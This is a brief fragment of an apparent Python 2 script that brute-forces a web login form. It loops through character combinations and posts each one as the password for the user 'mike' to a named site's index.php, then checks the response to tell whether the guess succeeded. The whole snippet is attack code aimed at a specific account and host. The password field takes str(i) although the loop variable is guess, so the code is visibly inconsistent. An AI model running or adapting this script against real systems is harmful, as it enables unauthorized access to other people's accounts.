...
for x in range(10):
	for guess in itertools.product((chars), repeat=x):
		...
		postdata = urllib.urlencode({'system': 'Admin','page': 'loginSubmit','username': 'mike','password': str(i)})
		#uncomment below to debug post data 
		#print postdata
		# Set URL to page receiving login POST data - Change url within single quotes 
		content = urllib2.urlopen('http://news.syn-pi.org/index.php',postdata).read()
		#uncomment below to debug returned content 
		#print content
		matches = re.findall(r'(?i)Username', content)
